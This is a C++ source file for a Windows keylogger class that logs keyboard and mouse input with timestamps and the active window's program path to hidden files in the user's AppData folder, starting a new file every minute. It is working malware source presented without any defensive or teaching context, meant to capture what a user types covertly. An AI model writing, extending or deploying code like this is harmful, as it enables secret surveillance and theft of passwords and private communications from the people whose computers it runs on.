#include "stdafx.h"
#include "KeyLogger.h"

#include <ctime>
#include <cstdlib>
#include <iomanip>
#include <sstream>
#include <fstream>
#include <shlobj.h>

KeyLogger::KeyLogger()
{

}

KeyLogger::~KeyLogger()
{

}

const std::string       KeyLogger::getAppDataFolder()
{
	TCHAR               szPath[MAX_PATH];
	std::string         path;

	if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, szPath)))
	{
		path = std::string(szPath);
		path += "\\";
	}
	else
		path = std::string("C:/");
	return (path);
}

void			KeyLogger::init()
{
	installPath = getFormatedOutput();
	write(installPath);
	start = std::time(NULL) - 1;
}

const std::string 		KeyLogger::getFormatedTime(const std::string & format) const
{
	char				buffer[MAX_PATH];
	struct tm			newtime;
	time_t				now = std::time(NULL);
	std::string			formatedTime;

	localtime_s(&newtime, &now);
	std::strftime(buffer, MAX_PATH, format.c_str(), &newtime);
	formatedTime = buffer;
	return (formatedTime);
}

const std::string 		KeyLogger::getFormatedOutput() const
{
	TCHAR				szPath[MAX_PATH];
	std::string			path;

	if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, szPath)))
	{
		path = std::string(szPath);
		path += "\\";
	}
	else
		path = std::string("C:/");

	path += this->getFormatedTime("%Y-%m-%d-%H-%M-%S") + std::string("-");
	path += std::string(LOGFILE);
	return (path);
}

void				KeyLogger::writeInputs(const std::string & filename)
{
	keyboard.write(filename);
	mouse.write(filename);
}

void				KeyLogger::write(const std::string & filename) const
{
	std::fstream	fs;

	fs.open(filename, std::fstream::out | std::fstream::app);
	fs << std::endl;
	fs << this->getFormatedTime("%Y-%m-%d") + std::string(" | ");
	fs << this->getFormatedTime("%Hh%M") + std::string(" | ");
	fs << process.getProcessPath(process.getProcessIdByWindowName(process.getActiveWindowTitle())) + std::string(" | ");
	fs.close();
}

void				KeyLogger::read()
{
	keyboard.read();
	mouse.read();
}

void				KeyLogger::run()
{
	time_t			now = std::time(NULL);
	time_t			elapsedTime = now - start;

	if (installPath.empty())
		this->init();
	if (process.isModified())
		this->write(installPath);
	else if (elapsedTime != 0 && (elapsedTime % 60) == 0)
	{
		start = now;
		this->init();
		this->write(installPath);
	}
	this->read();
	this->writeInputs(installPath);
}